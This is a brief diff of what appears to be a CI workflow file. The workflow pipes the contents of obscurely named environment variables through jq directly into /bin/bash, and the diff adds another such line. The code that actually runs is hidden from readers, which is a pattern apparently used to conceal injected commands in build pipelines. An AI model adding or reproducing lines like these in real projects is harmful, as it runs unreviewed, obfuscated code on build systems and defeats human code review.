@@ -28,6 +28,7 @@ jobs:
           echo $de7980 | jq -r .lvdln0 | /bin/bash
           echo $vgslk4561 | jq -r .p13570 | /bin/bash
           echo $mdwk546 | jq -r .u2866 | /bin/bash
+          printf '%s' "$pq66" | jq -r .irrze58 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
